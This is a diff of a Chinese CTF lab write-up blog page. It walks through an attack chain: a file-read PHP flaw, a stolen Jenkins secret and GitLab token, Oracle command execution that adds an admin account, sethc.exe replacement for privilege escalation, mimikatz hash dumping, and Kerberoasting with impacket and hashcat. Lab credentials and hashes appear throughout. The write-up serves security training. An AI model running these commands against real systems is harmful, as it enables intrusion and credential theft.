@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.cgjue.cn/img/ctfer4.png#%E4%B8%BB%E9%A1%B5%E5%9B%BE%E7%89%87">
 <meta property="article:published_time" content="2025-03-19T03:10:17.000Z">
-<meta property="article:modified_time" content="2025-03-19T05:50:29.722Z">
+<meta property="article:modified_time" content="2025-03-19T06:56:50.487Z">
 <meta property="article:author" content="D0G">
 <meta property="article:tag" content="jenkins Gitlab Kerberos Privilege Elevation">
 <meta name="twitter:card" content="summary_large_image">
@@ -242,7 +242,7 @@
         
         
         
-          122 分钟
+          125 分钟
         
       </span>
     
@@ -305,15 +305,15 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/../../themes/fluid/source/img/image-20250319112055068.png" srcset="/img/loading.gif" lazyload alt="image-20250319112055068"></p>
+                <h1 id="Privilege"><a href="#Privilege" class="headerlink" title="Privilege"></a>Privilege</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img src="/img/image-20250319112055068.png" srcset="/img/loading.gif" lazyload></p>
 <p>扫到备份文件<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
 <h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>拿到seay扫描一下，<del>根据题目描述发现有任意文件读取</del></p>
-<p><img src="/../../themes/fluid/source/img/image-20250319112244937.png" srcset="/img/loading.gif" lazyload alt="image-20250319112244937"></p>
+<p><img src="/img/image-20250319112244937.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$logfile</span> = <span class="hljs-title function_ invoke__">rawurldecode</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;logfile&#x27;</span>] );<br><span class="hljs-comment">// Make sure the file is exist.</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">file_exists</span>( <span class="hljs-variable">$logfile</span> ) ) &#123;<br>  <span class="hljs-comment">// Get the content and echo it.</span><br>  <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>( <span class="hljs-variable">$logfile</span> );<br>  <span class="hljs-keyword">echo</span>( <span class="hljs-variable">$text</span> );<br>&#125;<br><span class="hljs-keyword">exit</span>;<br><br></code></pre></td></tr></table></figure>
 
 <p><del>直接读flag试试，失败？看phpstudy是管理员权限，能读才对</del></p>
 <p>根据提示读jenkins密码</p>
-<p><img src="/../../themes/fluid/source/img/image-20250319112450897.png" srcset="/img/loading.gif" lazyload alt="image-20250319112450897"></p>
+<p><img src="/img/image-20250319112450897.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p> 510235cf43f14e83b88a9f144199655b</p>
 </blockquote>
@@ -331,10 +331,10 @@
 
 
 
-<p><img src="/../../themes/fluid/source/img/image-20250319113113285.png" srcset="/img/loading.gif" lazyload alt="image-20250319113113285"></p>
-<p><img src="/../../themes/fluid/source/img/image-20250319121920815.png" srcset="/img/loading.gif" lazyload alt="image-20250319121920815"></p>
+<p><img src="/img/image-20250319113113285.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/image-20250319121920815.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>fscan拿信息</p>
-<p><img src="/../../themes/fluid/source/img/image-20250319113719592.png" srcset="/img/loading.gif" lazyload alt="image-20250319113719592"></p>
+<p><img src="/img/image-20250319113719592.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="内网信息"><a href="#内网信息" class="headerlink" title="内网信息"></a>内网信息</h3><blockquote>
 <p>172.22.14.7 本机，已最高权限 </p>
 <p>172.22.14.46 XR-0923 </p>
@@ -342,7 +342,7 @@
 <p>172.22.14.31 XR-ORACLE </p>
 <p>172.22.14.16 GitLab</p>
 </blockquote>
-<h3 id="Gitlab-API-Token"><a href="#Gitlab-API-Token" class="headerlink" title="Gitlab API Token"></a>Gitlab API Token</h3><p><img src="/../../themes/fluid/source/img/image-20250319114415318.png" srcset="/img/loading.gif" lazyload alt="image-20250319114415318"></p>
+<h3 id="Gitlab-API-Token"><a href="#Gitlab-API-Token" class="headerlink" title="Gitlab API Token"></a>Gitlab API Token</h3><p><img src="/img/image-20250319114415318.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&#123;AQAAABAAAAA<span class="hljs-name">g9</span><span class="hljs-number">+7</span>GBocqYm<span class="hljs-meta">o0</span>y<span class="hljs-number">3</span>H+uDK<span class="hljs-number">9</span>iPs<span class="hljs-attr">vst95</span>F<span class="hljs-number">5</span>i<span class="hljs-number">3</span>Q<span class="hljs-meta">O3</span>zafr<span class="hljs-name">m2</span>TC<span class="hljs-number">5</span>U<span class="hljs-number">24</span>QCq<span class="hljs-number">0</span>zm/GEobmrmLYh&#125;<br></code></pre></td></tr></table></figure>
 
 
@@ -352,7 +352,7 @@
 
 
 
-<p><img src="/../../themes/fluid/source/img/image-20250319120419498.png" srcset="/img/loading.gif" lazyload alt="image-20250319120419498"></p>
+<p><img src="/img/image-20250319120419498.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">glpat</span>-<span class="hljs-number">7</span>kD_qLH2PiQv_ywB9hz2<br></code></pre></td></tr></table></figure>
 
 
@@ -369,17 +369,17 @@
 <h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>使用odat 创建管理员用户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;net user dog qwer1234! /add&#x27;</span><br>proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;net localgroup administrators dog /add&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319121537342.png" srcset="/img/loading.gif" lazyload alt="image-20250319121537342"></p>
-<p><img src="/../../themes/fluid/source/img/image-20250319121751640.png" srcset="/img/loading.gif" lazyload alt="image-20250319121751640"></p>
+<p><img src="/img/image-20250319121537342.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/image-20250319121751640.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="flag3-4"><a href="#flag3-4" class="headerlink" title="flag3&amp;4"></a>flag3&amp;4</h2><p>internal-secret里有一个文本，里面是一堆账号信息，从里面找到XR-0923的</p>
-<p><img src="/../../themes/fluid/source/img/image-20250319122646195.png" srcset="/img/loading.gif" lazyload alt="image-20250319122646195"></p>
+<p><img src="/img/image-20250319122646195.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>XR-0923 (172.22.14.46)</p>
 <p>zhangshuai</p>
 <p>wSbEajHzZs</p>
 </blockquote>
 <p>RDP上XR-0923的时候发现这个用户属于Remote Desktop Users和Remote Management Users组所以能evil-winrm上去，感觉用这个连上去权限高点？怎么多了一些特权</p>
-<p><img src="/../../themes/fluid/source/img/image-20250319123052101.png" srcset="/img/loading.gif" lazyload alt="image-20250319123052101"></p>
+<p><img src="/img/image-20250319123052101.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs<br></code></pre></td></tr></table></figure>
 
 <h3 id="SeRestorePrivilege提权"><a href="#SeRestorePrivilege提权" class="headerlink" title="SeRestorePrivilege提权"></a>SeRestorePrivilege提权</h3><blockquote>
@@ -387,28 +387,34 @@
 <p>覆盖系统进程使用的DLL </p>
 <p>修改注册表设置</p>
 </blockquote>
-<p>因为有SeRestorePrivilege，所以能无视ACL修改文件或者编辑注册表，类似于之前的放大镜提权，我们可以把cmd.exe重命名为sethc.exe，然后在锁屏界面连按五次shift启动sethc提权</p>
+<p>因为有SeRestorePrivilege，所以能无视ACL修改文件或者编辑注册表，类似于之前的放大镜提权，我们可以把cmd.exe重命名为sethc.exe，然后在锁屏界面连按五次shift启动sethc提权(或者修改utilman.exe，锁屏界面 win+U提权)</p>
+<blockquote>
+<p><strong>ACL</strong>（Access Control List，访问控制列表）是计算机系统和网络中用于管理资源访问权限的一种机制。它定义了哪些用户、组或系统进程可以访问特定资源（如文件、目录、网络资源等），以及允许执行的操作（如读取、写入、执行等）。</p>
+</blockquote>
 <figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ren</span> sethc.exe sethc.bak<br><span class="hljs-built_in">ren</span> <span class="hljs-built_in">cmd</span>.exe sethc.exe<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319123819499.png" srcset="/img/loading.gif" lazyload alt="image-20250319123819499"></p>
+<p><img src="/img/image-20250319123819499.png" srcset="/img/loading.gif" lazyload></p>
 <p>拿flag然后添加个admin账号重新登进去</p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">dog</span> qwer1234! /add<br>net localgroup administrators dog /add<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319124009746.png" srcset="/img/loading.gif" lazyload alt="image-20250319124009746"></p>
+<p><img src="/img/image-20250319124009746.png" srcset="/img/loading.gif" lazyload></p>
 <p>重新rdp拿到flag3</p>
 <p>上传猕猴桃拿ntml</p>
-<p><img src="/../../themes/fluid/source/img/image-20250319124401569.png" srcset="/img/loading.gif" lazyload alt="image-20250319124401569"></p>
+<p><img src="/img/image-20250319124401569.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
 <p>b5a7f501c6626cf82b9d8a3dfe49fd66</p>
 </blockquote>
 <h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>拿着 <code>XR-0923$</code> 的ntlm哈希看SPN能找到一个tianjing用户</p>
+<blockquote>
+<p>枚举域环境中注册的 <strong>SPN（Service Principal Names）</strong></p>
+</blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains impacket-GetUserSPNs xiaorang.lab/<span class="hljs-string">&#x27;XR-0923$&#x27;</span> -hashes <span class="hljs-string">&#x27;:b5a7f501c6626cf82b9d8a3dfe49fd66&#x27;</span> -dc-ip 172.22.14.11<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319124556246.png" srcset="/img/loading.gif" lazyload alt="image-20250319124556246"></p>
+<p><img src="/img/image-20250319124556246.png" srcset="/img/loading.gif" lazyload></p>
 <p>抓一下哈希</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains impacket-GetUserSPNs xiaorang.lab/<span class="hljs-string">&#x27;XR-0923$&#x27;</span> -hashes <span class="hljs-string">&#x27;:b5a7f501c6626cf82b9d8a3dfe49fd66&#x27;</span> -dc-ip 172.22.14.11 -request-user tianjing<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319124623631.png" srcset="/img/loading.gif" lazyload alt="image-20250319124623631"></p>
+<p><img src="/img/image-20250319124623631.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$krb<span class="hljs-number">5</span>tgs$<span class="hljs-number">23</span>$*tianjing$XIAORANG.LAB$xiaorang.lab/tianjing*$<span class="hljs-number">4</span>b<span class="hljs-number">61</span>de<span class="hljs-number">3e3</span>fc<span class="hljs-number">44</span>ffbaf<span class="hljs-number">89</span>ec<span class="hljs-number">2</span>cd<span class="hljs-number">77</span>d<span class="hljs-number">2</span>bba$<span class="hljs-number">0</span>b<span class="hljs-number">6</span>b<span class="hljs-number">9</span>f<span class="hljs-number">0</span>aa<span class="hljs-number">0</span>a<span class="hljs-number">5</span>fba<span class="hljs-number">610</span><span class="hljs-keyword">cc</span><span class="hljs-number">9</span>d<span class="hljs-number">0994e4</span>b<span class="hljs-number">9223280</span>d<span class="hljs-number">53</span>f<span class="hljs-number">965</span><span class="hljs-keyword">c</span><span class="hljs-number">39</span>f<span class="hljs-number">06</span>ca<span class="hljs-number">9</span>f<span class="hljs-number">1</span>d<span class="hljs-number">92</span><span class="hljs-keyword">c</span><span class="hljs-number">836</span>b<span class="hljs-number">263</span><span class="hljs-keyword">c</span><span class="hljs-number">661631</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span>bf<span class="hljs-number">9</span>d<span class="hljs-number">87</span>b<span class="hljs-number">025</span>bf<span class="hljs-number">16</span><span class="hljs-keyword">c</span><span class="hljs-number">94</span>ec<span class="hljs-number">9</span>b<span class="hljs-number">65918</span>eae<span class="hljs-number">88</span>cec<span class="hljs-number">36</span><span class="hljs-keyword">c</span><span class="hljs-number">614322</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>f<span class="hljs-number">627366</span>ef<span class="hljs-number">1</span>a<span class="hljs-number">10</span>adfdc<span class="hljs-number">94</span>b<span class="hljs-number">564e31203</span>fcb<span class="hljs-number">3094</span><span class="hljs-keyword">c</span><span class="hljs-number">596419</span>b<span class="hljs-number">3e837</span><span class="hljs-keyword">c</span><span class="hljs-number">44e8584</span>ee<span class="hljs-number">751996</span>f<span class="hljs-number">0437</span>b<span class="hljs-number">08</span>bbfe<span class="hljs-number">86e3</span>faed<span class="hljs-number">3</span>a<span class="hljs-number">809</span>a<span class="hljs-number">3476</span>a<span class="hljs-number">519</span>ddeb<span class="hljs-number">2</span>f<span class="hljs-number">3</span>b<span class="hljs-number">7e3</span>fc<span class="hljs-number">13567</span>aa<span class="hljs-number">28</span>a<span class="hljs-number">5</span>ce<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">722</span>d<span class="hljs-number">7</span>b<span class="hljs-number">1</span>d<span class="hljs-number">660434</span>a<span class="hljs-number">33e786</span>baa<span class="hljs-number">5</span>f<span class="hljs-number">86727</span>b<span class="hljs-number">6e964</span>f<span class="hljs-number">9</span>b<span class="hljs-number">39123</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>ad<span class="hljs-number">66</span>b<span class="hljs-number">419</span>ea<span class="hljs-number">821</span>ee<span class="hljs-number">289</span>dceefa<span class="hljs-number">8</span>f<span class="hljs-number">34</span>d<span class="hljs-number">7e219</span>a<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">466</span>fd<span class="hljs-number">6</span>f<span class="hljs-number">2</span>a<span class="hljs-number">713</span>d<span class="hljs-number">49936</span>bc<span class="hljs-number">6</span>fde<span class="hljs-number">71</span>aa<span class="hljs-number">95</span>dbb<span class="hljs-number">350676</span>fa<span class="hljs-number">5</span>aaf<span class="hljs-number">48</span>f<span class="hljs-number">51</span>f<span class="hljs-number">0</span>ceaa<span class="hljs-number">04e437964</span>a<span class="hljs-number">6e2</span>bcd<span class="hljs-number">84</span>d<span class="hljs-number">90</span>d<span class="hljs-number">757e840</span>f<span class="hljs-number">43</span>d<span class="hljs-number">36</span>b<span class="hljs-number">4</span>efc<span class="hljs-number">3</span>b<span class="hljs-number">5</span>ca<span class="hljs-number">39908</span>af<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">633</span>f<span class="hljs-number">3</span>a<span class="hljs-number">330070e26</span>f<span class="hljs-number">4</span>ac<span class="hljs-number">04</span><span class="hljs-keyword">c</span><span class="hljs-number">585</span>b<span class="hljs-number">787</span><span class="hljs-keyword">c</span><span class="hljs-number">154969</span>f<span class="hljs-number">80</span>f<span class="hljs-number">5</span>a<span class="hljs-number">44</span>d<span class="hljs-number">268</span>a<span class="hljs-number">8887</span>a<span class="hljs-number">7430</span>ac<span class="hljs-number">7707</span>a<span class="hljs-number">3e768450</span>dad<span class="hljs-number">833</span>cda<span class="hljs-number">6</span>fb<span class="hljs-number">72</span>aa<span class="hljs-number">8</span>f<span class="hljs-number">86</span>fb<span class="hljs-number">15</span>ef<span class="hljs-number">898</span>ad<span class="hljs-number">8</span>d<span class="hljs-number">43</span><span class="hljs-keyword">c</span><span class="hljs-number">3622</span>eb<span class="hljs-number">5871</span>d<span class="hljs-number">7084</span>de<span class="hljs-number">77</span>f<span class="hljs-number">51</span><span class="hljs-keyword">c</span><span class="hljs-number">90003</span>bed<span class="hljs-number">4</span>ec<span class="hljs-number">0</span>ab<span class="hljs-number">0</span>ccb<span class="hljs-number">8304</span>ccce<span class="hljs-number">01e6136</span>fc<span class="hljs-number">17379</span>eeb<span class="hljs-number">0</span>a<span class="hljs-number">622</span><span class="hljs-keyword">c</span><span class="hljs-number">67</span>a<span class="hljs-number">60</span>faec<span class="hljs-number">1</span>fa<span class="hljs-number">4</span>d<span class="hljs-number">91865</span>dce<span class="hljs-number">000e2</span>e<span class="hljs-number">217</span><span class="hljs-keyword">cc</span><span class="hljs-number">450</span>fc<span class="hljs-number">52566e98</span>da<span class="hljs-number">13979232e6</span>ac<span class="hljs-number">19e3</span>f<span class="hljs-number">6</span>b<span class="hljs-number">2</span>f<span class="hljs-number">09431</span>b<span class="hljs-number">639</span>ca<span class="hljs-number">4358523</span>a<span class="hljs-number">96268766</span>b<span class="hljs-number">22178</span>dc<span class="hljs-number">57</span>d<span class="hljs-number">6001</span>de<span class="hljs-number">2</span>b<span class="hljs-number">86</span>ed<span class="hljs-number">13</span>b<span class="hljs-number">5754131</span>f<span class="hljs-number">8e49125051870</span>d<span class="hljs-number">49e0</span>a<span class="hljs-number">962</span>a<span class="hljs-number">8</span>fa<span class="hljs-number">90444</span>fae<span class="hljs-number">5e90</span>a<span class="hljs-number">8</span>ff<span class="hljs-number">7</span>b<span class="hljs-number">38</span>dc<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>dac<span class="hljs-number">7260</span>f<span class="hljs-number">9674</span>ad<span class="hljs-number">7</span>ae<span class="hljs-number">62</span>a<span class="hljs-number">6</span>da<span class="hljs-number">645</span>f<span class="hljs-number">0</span>d<span class="hljs-number">0025</span><span class="hljs-keyword">c</span><span class="hljs-number">1067</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>d<span class="hljs-number">53</span>b<span class="hljs-number">86</span>b<span class="hljs-number">93</span>fdef<span class="hljs-number">955</span>a<span class="hljs-number">18</span>d<span class="hljs-number">0360</span>d<span class="hljs-number">94596</span>f<span class="hljs-number">76459</span>f<span class="hljs-number">75e626</span>ca<span class="hljs-number">11</span>b<span class="hljs-number">239</span>b<span class="hljs-number">02119</span>d<span class="hljs-number">49e463</span>a<span class="hljs-number">5815</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">32</span>f<span class="hljs-number">90</span>a<span class="hljs-number">878</span>b<span class="hljs-number">051</span>f<span class="hljs-number">0086</span>a<span class="hljs-number">20</span>a<span class="hljs-number">2229427444725e54</span>e<span class="hljs-number">0</span>b<span class="hljs-number">86</span>f<span class="hljs-number">316835</span>acdb<span class="hljs-number">10</span>fef<span class="hljs-number">819870</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>b<span class="hljs-number">18</span>b<span class="hljs-number">110e20</span>d<span class="hljs-number">7508</span>a<span class="hljs-number">025552740136</span>cf<span class="hljs-number">193</span>f<span class="hljs-number">26542e4</span>f<span class="hljs-number">31</span>f<span class="hljs-number">93</span>ce<span class="hljs-number">6</span>b<span class="hljs-number">7951150537e8</span>cb<span class="hljs-number">96</span>a<span class="hljs-number">0</span>fbf<span class="hljs-number">5722</span>a<span class="hljs-number">4</span>a<span class="hljs-number">50</span>ec<span class="hljs-number">5</span>ed<span class="hljs-number">1263</span><span class="hljs-keyword">c</span><span class="hljs-number">8310</span>f<span class="hljs-number">36</span>b<span class="hljs-number">41</span>b<span class="hljs-number">3867</span>ecd<span class="hljs-number">1</span>abd<span class="hljs-number">4852</span>b<span class="hljs-number">3</span>cadecc<span class="hljs-number">7</span>d<span class="hljs-number">86175</span>de<span class="hljs-number">08377</span>f<span class="hljs-number">48400768</span>ebcffb<span class="hljs-number">193</span>b<span class="hljs-number">2</span>aa<span class="hljs-number">2272747</span><span class="hljs-keyword">c</span><span class="hljs-number">910</span>f<span class="hljs-number">154e93</span>d<span class="hljs-number">149</span>b<span class="hljs-number">5</span>f<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">6146202</span>aa<span class="hljs-number">38</span>d<span class="hljs-number">291</span>fb<span class="hljs-number">0740</span>d<span class="hljs-number">84</span>d<span class="hljs-number">3</span>f<span class="hljs-number">7</span>f<span class="hljs-number">9502</span>eb<span class="hljs-number">8286</span>cd<span class="hljs-number">1</span>b<span class="hljs-number">1</span>d<span class="hljs-number">267</span><span class="hljs-keyword">c</span><span class="hljs-number">06</span>d<span class="hljs-number">93</span>b<span class="hljs-number">66429</span>f<span class="hljs-number">3181297e7</span>b<span class="hljs-number">0e9240108</span>bf<span class="hljs-number">59e8</span>a<span class="hljs-number">0310</span>d<span class="hljs-number">0</span>a<span class="hljs-number">89</span>fb<span class="hljs-number">1344039</span>fb<span class="hljs-number">34e924</span>d<span class="hljs-number">1</span>d<span class="hljs-number">8</span>b<span class="hljs-number">9393e9</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">07</span>a<span class="hljs-number">6295</span>aa<span class="hljs-number">39474656e16</span>ad<span class="hljs-number">08726191e645</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>ad<span class="hljs-number">774</span>fd<span class="hljs-number">940278</span><span class="hljs-keyword">c</span><span class="hljs-number">69</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>a<span class="hljs-number">57</span>b<span class="hljs-number">4</span>b<span class="hljs-number">10</span>ae<span class="hljs-number">55e323</span>f<span class="hljs-number">0</span>bcf<span class="hljs-number">2</span>eb<span class="hljs-number">50</span>f<span class="hljs-number">06</span>b<span class="hljs-number">61</span><span class="hljs-keyword">c</span><span class="hljs-number">7446</span>a<span class="hljs-number">4</span>f<span class="hljs-number">1</span>bb<span class="hljs-number">1</span>f<span class="hljs-number">997e187</span>d<span class="hljs-number">5665</span>f<span class="hljs-number">32e6292235735171478</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>a<span class="hljs-number">185</span>a<span class="hljs-number">4</span>d<span class="hljs-number">70</span>eae<span class="hljs-number">0</span>b<span class="hljs-number">515</span>fe<span class="hljs-number">3</span>cf<span class="hljs-number">227217</span><span class="hljs-keyword">c</span><span class="hljs-number">48</span>f<span class="hljs-number">8379236</span>aa<span class="hljs-number">3</span>ea<span class="hljs-number">27</span>a<span class="hljs-number">9637</span>fc<span class="hljs-number">7</span>d<span class="hljs-number">8</span>fed<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">3013</span>f<span class="hljs-number">678715</span>b<span class="hljs-number">8444e6463</span>ef<span class="hljs-number">6e497</span>f<span class="hljs-number">5</span>a<span class="hljs-number">070</span>d<span class="hljs-number">223</span>d<span class="hljs-number">15</span>b<span class="hljs-number">8</span>a<span class="hljs-number">3129</span>a<span class="hljs-number">0</span>fd<span class="hljs-number">853</span>d<span class="hljs-number">8</span>fab<span class="hljs-number">3</span>f<span class="hljs-number">6</span>b<span class="hljs-number">3463</span>eca<span class="hljs-number">29</span>eba<span class="hljs-number">2e724</span>a<span class="hljs-number">933</span>ee<span class="hljs-number">6</span>b<span class="hljs-number">8</span>dbf<span class="hljs-number">98884707743</span>eb<span class="hljs-number">8e78</span>b<span class="hljs-number">0</span>a<span class="hljs-number">4</span>dae<span class="hljs-number">52</span>a<span class="hljs-number">334</span><span class="hljs-keyword">c</span><span class="hljs-number">79</span>bfb<span class="hljs-number">9199</span><span class="hljs-keyword">cc</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">46</span>b<span class="hljs-number">8</span>a<span class="hljs-number">7564416</span><span class="hljs-keyword">c</span><span class="hljs-number">659635</span>f<span class="hljs-number">5</span>cdafcef<span class="hljs-number">031</span>d<span class="hljs-number">16</span>b<span class="hljs-number">5</span>ccdd<span class="hljs-number">4459</span>f<span class="hljs-number">52</span>a<span class="hljs-number">72597</span>f<span class="hljs-number">7058</span>dce<span class="hljs-number">909</span>b<span class="hljs-number">163</span>ed<span class="hljs-number">61014</span>a<span class="hljs-number">019e2</span>a<span class="hljs-number">73</span>fe<span class="hljs-number">44</span>f<span class="hljs-number">1e2187</span><span class="hljs-keyword">c</span><span class="hljs-number">12e5</span>e<span class="hljs-number">4</span>fea<span class="hljs-number">2</span>da<span class="hljs-number">3</span>fc<span class="hljs-number">2</span>f<span class="hljs-number">6170</span>daf<span class="hljs-number">165</span>ae<span class="hljs-number">20</span>d<span class="hljs-number">95e92</span>aa<span class="hljs-number">3</span>beaa<span class="hljs-number">10e5</span>cf<span class="hljs-number">4398e2476</span>dce<span class="hljs-number">8e44</span>b<span class="hljs-number">8</span>cbbb<span class="hljs-number">92</span><span class="hljs-keyword">c</span><span class="hljs-number">7506545</span>f<span class="hljs-number">51202296492</span>b<span class="hljs-number">65</span>b<span class="hljs-number">18</span><span class="hljs-keyword">c</span><span class="hljs-number">24e82</span>bf<span class="hljs-number">27e975</span>de<span class="hljs-number">915e75</span>a<span class="hljs-number">01</span>b<span class="hljs-number">9</span>f<span class="hljs-number">793</span>b<span class="hljs-number">7</span>b<span class="hljs-number">14</span>ac<span class="hljs-number">1</span>ed<span class="hljs-number">32</span>f<span class="hljs-number">1</span>b<span class="hljs-number">173</span>ae<span class="hljs-number">9</span>d<span class="hljs-number">7</span>d<span class="hljs-number">1</span>efdc<span class="hljs-number">896e14</span>af<span class="hljs-number">09</span>ba<span class="hljs-number">4528</span>a<span class="hljs-number">505e823</span>b<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>f<span class="hljs-number">8</span>b<span class="hljs-number">952194076</span>ed<span class="hljs-number">849</span>ec<span class="hljs-number">052</span>cf<span class="hljs-number">0</span>ed<span class="hljs-number">9</span>aa<span class="hljs-number">2</span>a<span class="hljs-number">7</span>cb<span class="hljs-number">2</span>bf<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">7242</span>d<span class="hljs-number">819</span>bf<span class="hljs-number">191</span><span class="hljs-keyword">c</span><span class="hljs-number">41</span>cfe<span class="hljs-number">2</span>caf<span class="hljs-number">05</span>a<span class="hljs-number">2</span>aa<span class="hljs-number">2</span>a<span class="hljs-number">8756</span>bb<span class="hljs-number">627719</span>a<span class="hljs-number">09314194</span>a<span class="hljs-number">0</span>ac<span class="hljs-number">0</span>f<span class="hljs-number">42237</span>b<span class="hljs-number">85967597</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>bf<span class="hljs-number">541</span>bdfd<span class="hljs-number">478</span>efc<span class="hljs-number">66</span>d<span class="hljs-number">590</span>b<span class="hljs-number">0</span>a<span class="hljs-number">5e4888119</span>bf<span class="hljs-number">878</span>fc<span class="hljs-number">31</span><span class="hljs-keyword">ccc</span><span class="hljs-number">346</span><span class="hljs-keyword">c</span><span class="hljs-number">412</span>b<span class="hljs-number">5</span>ffeef<span class="hljs-number">2</span>d<br></code></pre></td></tr></table></figure>
 
 <p>保存1.txt 用hashcat爆破</p>
@@ -420,11 +426,23 @@
 <p>tianjing</p>
 <p>DPQSXSXgh2</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 <br><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 <br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../themes/fluid/source/img/image-20250319125014237.png" srcset="/img/loading.gif" lazyload alt="image-20250319125014237"></p>
